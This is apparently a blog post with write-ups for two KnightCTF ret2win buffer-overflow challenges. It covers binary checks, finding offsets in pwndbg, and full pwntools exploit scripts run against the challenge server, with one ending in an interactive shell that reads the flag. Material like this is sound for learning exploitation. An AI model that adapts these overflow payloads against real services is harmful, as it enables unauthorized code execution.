---
title: "KnightCTF"
date: 2024-01-21
layout: "simple"
categories: [Binary exploitation]
tags: [KnightCTF]
image: https://i.ibb.co/cgYN2Kr/th-3134630742.jpg
excerpt: "Some challenges I created"
---

# Get The Sword
```
Can you get the sword ?
Author : froghunter
Download Link - 1 : https://drive.google.com/file/d/1HsQMxiZlP5978DzqnoZs6g6QOnCzVm_G/view
```
Doing some basic file checks we see that the binary is a 32bit LSB executable which will really affect how we approach this challenge. The binary is also dynamically linked and not stripped.

```
dexter@lab:~/the-lab/knights/rev$ file get_sword    
get_sword: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=4a9b260935bf815a04350e3bb9e0e4422f504b2a, for GNU/Linux 4.4.0, not stripped
```

Now looking at the securities set with the binary, we see that it really is not protected. We have no canary, meaning we can perform a buffer overflow with ease. NX is also unkown which would make executing shellcode on the stack very possible. Also there is No Pie which would mean that the addresses will remain the same every time the binary is ran.

```
dexter@lab:~/the-lab/knights/rev$ checksec get_sword
[*] '/home/dexter/the-lab/knights/rev/get_sword'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments

```
With that knowledge we can now fire up ```gdb``` and see how the binary works.

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049040  __libc_start_main@plt
0x08049050  printf@plt
0x08049060  fflush@plt
0x08049070  puts@plt
0x08049080  system@plt
0x08049090  __isoc99_scanf@plt
0x080490a0  _start
0x080490e0  _dl_relocate_static_pie
0x080490f0  __x86.get_pc_thunk.bx
0x080491b6  printSword
0x08049218  getSword
0x08049256  intro
0x080492c0  main
0x080492e1  __x86.get_pc_thunk.ax
0x080492e8  _fini
pwndbg> 
```

Interesting, according to the challenge name (get the sword) we see a function ```getSword```, well that is an interesting function. But before we get there, let us disassemble the main function.

```
pwndbg> disass main
Dump of assembler code for function main:
   0x080492c0 <+0>:	push   ebp
   0x080492c1 <+1>:	mov    ebp,esp
   0x080492c3 <+3>:	and    esp,0xfffffff0
   0x080492c6 <+6>:	call   0x80492e1 <__x86.get_pc_thunk.ax>
   0x080492cb <+11>:	add    eax,0x2d29
   0x080492d0 <+16>:	call   0x80491b6 <printSword>
   0x080492d5 <+21>:	call   0x8049256 <intro>
   0x080492da <+26>:	mov    eax,0x0
   0x080492df <+31>:	leave
   0x080492e0 <+32>:	ret
End of assembler dump.
```

Okay so now looking at this we can see that main does not really call the function ```getSword```. So this can confirm that it is a win function. Awesome let us now dig for our buffer which will enable us to overwrite adjacent memory.

Using cyclic to generate a pattern ..

```
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> r
Starting program: /home/dexter/the-lab/knights/rev/get_sword 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
      />_________________________________
[#####[]_________________________________>
      \>
What do you want ? ?: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
You want, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616169 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────────────────
*EAX  0x6f
*EBX  0x61616167 ('gaaa')
*ECX  0xffffcc8c ◂— 0x5d67b300
*EDX  0x1
*EDI  0xf7ffcba0 (_rtld_global_ro) ◂— 0x0
*ESI  0x804bef8 —▸ 0x8049180 ◂— endbr32 
*EBP  0x61616168 ('haaa')
*ESP  0xffffcd10 ◂— 'jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
*EIP  0x61616169 ('iaaa')
──────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x61616169










──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffcd10 ◂— 'jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
01:0004│     0xffffcd14 ◂— 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
02:0008│     0xffffcd18 ◂— 'laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
03:000c│     0xffffcd1c ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
04:0010│     0xffffcd20 ◂— 'naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
05:0014│     0xffffcd24 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
06:0018│     0xffffcd28 ◂— 'paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
07:001c│     0xffffcd2c ◂— 'qaaaraaasaaataaauaaavaaawaaaxaaayaaa'
────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0 0x61616169
   1 0x6161616a
   2 0x6161616b
   3 0x6161616c
   4 0x6161616d
   5 0x6161616e
   6 0x6161616f
   7 0x61616170
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

The binary faults obviously and now we can get the offset. So now we can grab whatever was in our instruction pointer and get the offset. 

```
pwndbg> cyclic -l iaaa
Finding cyclic pattern of 4 bytes: b'iaaa' (hex: 0x69616161)
Found at offset 32
```

With that we can now craft our exploit.

```
from pwn import *

binary = context.binary = ELF("./get_sword", checksec=False)

p = remote("173.255.201.51", 31337)

buffer = b'A' * 32

win = binary.sym.getSword

ret = p32(0x0804900e)

payload = buffer
payload += p32(win)

p.sendline(payload)
p.interactive()
```
Probably wondering what the elf stuff is ....

ELF: refers to the Executable and Linkable Format, which is a common file format for executables, object code, shared libraries, and even core dumps on Unix systems. It's commonly used for programs on Linux systems.

"./get_sword": This is the path to an ELF binary file named "get_sword."

checksec=False: related to a tool used for analyzing the security features of an ELF binary. Setting checksec to False means that the security features of the binary are not being checked.

binary = context.binary: assign the ELF binary to a variable named binary within a context or environment.

Basically it helps to input addresess in the binary automatically, helps alot when the binary has pie enabled, no harm is done when there is No PIE.

```
dexter@lab:~/the-lab/knights/rev$ python3 solve.py    
[+] Opening connection to 173.255.201.51 on port 31337: Done
[*] Switching to interactive mode
      />_________________________________
[#####[]_________________________________>
      \>
What do you want ? ?: KCTF{so_you_g0t_the_sw0rd}
```
# Win..Win..Window

```
You are a skilled hacker known for your expertise in binary exploitation. One day, you receive an anonymous message challenging your abilities. The message contains a mysterious binary file. Now you decide to analyze the file.

Attachment 1
Attachment 2
Attachment 3

Flag Format: KCTF{S0m3th1ng_h3re}

Author: Pratham Naik (YCF)
```
Second challenge and the title already gives you an idea that it is also a ret2win challenge. 

Doing some basic file checks this time we are working with 64-bit executable. Ha! they only changed that but the solve process remains the same

```
dexter@lab:~/the-lab/knights/rev$ file win    
win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f5ac48d36515bfa0e2e4f62a9e57ee7510516169, for GNU/Linux 4.4.0, not stripped
```

Let us check the securities, and the only difference here is that NX is enabled, meaning that we cannot execute shellcode on the stack.

```
dexter@lab:~/the-lab/knights/rev$ checksec win      
[*] '/home/dexter/the-lab/knights/rev/win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
With that we can then step into a debugger and get more information.

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  system@plt
0x0000000000401050  gets@plt
0x0000000000401060  fflush@plt
0x0000000000401070  _start
0x00000000004010a0  _dl_relocate_static_pie
0x0000000000401156  shell
0x000000000040118a  main
0x00000000004011d0  _fini
```

You see already where this is going. We have a function called ```shell``` which my guess does some system call.

```
pwndbg> disass shell
Dump of assembler code for function shell:
   0x0000000000401156 <+0>:	push   rbp
   0x0000000000401157 <+1>:	mov    rbp,rsp
   0x000000000040115a <+4>:	lea    rax,[rip+0xea7]        # 0x402008
   0x0000000000401161 <+11>:	mov    rdi,rax
   0x0000000000401164 <+14>:	call   0x401030 <puts@plt>
   0x0000000000401169 <+19>:	lea    rax,[rip+0xead]        # 0x40201d
   0x0000000000401170 <+26>:	mov    rdi,rax
   0x0000000000401173 <+29>:	call   0x401030 <puts@plt>
   0x0000000000401178 <+34>:	lea    rax,[rip+0xea7]        # 0x402026
   0x000000000040117f <+41>:	mov    rdi,rax
   0x0000000000401182 <+44>:	call   0x401040 <system@plt>
   0x0000000000401187 <+49>:	nop
   0x0000000000401188 <+50>:	pop    rbp
   0x0000000000401189 <+51>:	ret
End of assembler dump.
```
Oow would you look at that, how convenient.

We can then check the offset using cyclic.

```
pwndbg> r
Starting program: /home/dexter/the-lab/knights/rev/win 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Can u find me ? i dont think so...!
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Program received signal SIGSEGV, Segmentation fault.
0x00000000004011ce in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x0
*RBX  0x7fffffffdc28 —▸ 0x7fffffffdfe3 ◂— '/home/dexter/the-lab/knights/rev/win'
*RCX  0x7ffff7f9daa0 (_IO_2_1_stdin_) ◂— 0xfbad2288
 RDX  0x0
*RDI  0x7ffff7f9fa40 (_IO_stdfile_0_lock) ◂— 0x0
*RSI  0x4056b1 ◂— 'aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n'
*R8   0x405715 ◂— 0x0
 R9   0x0
*R10  0x1000
*R11  0x246
 R12  0x0
*R13  0x7fffffffdc38 —▸ 0x7fffffffe008 ◂— 0x5245545f5353454c ('LESS_TER')
*R14  0x403df0 —▸ 0x401120 ◂— endbr64 
*R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2d0 ◂— 0x0
*RBP  0x6163616161616161 ('aaaaaaca')
*RSP  0x7fffffffdb18 ◂— 'aaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
*RIP  0x4011ce (main+68) ◂— ret 
─────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x4011ce <main+68>    ret    <0x6164616161616161>










──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdb18 ◂— 'aaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
01:0008│     0x7fffffffdb20 ◂— 'aaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
02:0010│     0x7fffffffdb28 ◂— 'aaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
03:0018│     0x7fffffffdb30 ◂— 'aaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
04:0020│     0x7fffffffdb38 ◂— 'aaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
05:0028│     0x7fffffffdb40 ◂— 'aaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
06:0030│     0x7fffffffdb48 ◂— 'aaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
07:0038│     0x7fffffffdb50 ◂— 'aaaaaakaaaaaaalaaaaaaamaaa'
────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x4011ce main+68
   1 0x6164616161616161
   2 0x6165616161616161
   3 0x6166616161616161
   4 0x6167616161616161
   5 0x6168616161616161
   6 0x6169616161616161
   7 0x616a616161616161
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```
This time we are going to pick the pattern that was stored in ```rbp``` and then we are going to add 8 bytes in order to be able to write adjacent memory from the stack pointer. 

```
pwndbg> cyclic -l aaaaaaca
Finding cyclic pattern of 8 bytes: b'aaaaaaca' (hex: 0x6161616161616361)
Found at offset 10
```
This would bring our offset to 18. Ideally we also need to check for a ret gadget since By overwriting the return address on the stack with the address of a ret gadget, we can control where the program execution will continue. And we want the flow to our win (shell) function.

With that we can craft our payload 

```
from pwn import *

binary = context.binary = ELF("./win", checksec=False)

# p = process()
p = remote("173.255.201.51", 3337)

buffer = b'A' * 18
win = p64(0x0401156)
ret = p64(0x040101a)

payload = buffer
payload += ret
payload += win

p.sendline(payload)
p.interactive()
```
Noice......

```
dexter@lab:~/the-lab/knights/rev$ python3 solve_win.py 
[+] Opening connection to 173.255.201.51 on port 3337: Done
[*] Switching to interactive mode
Can u find me ? i dont think so...!
$ id
uid=1000(pwn) gid=1000(pwn) groups=1000(pwn)
$ ls
flag.txt
win
ynetd
$ cat flag.txt
KCTF{r3T_7o_W1n_iS_V3rRY_3AsY}
```
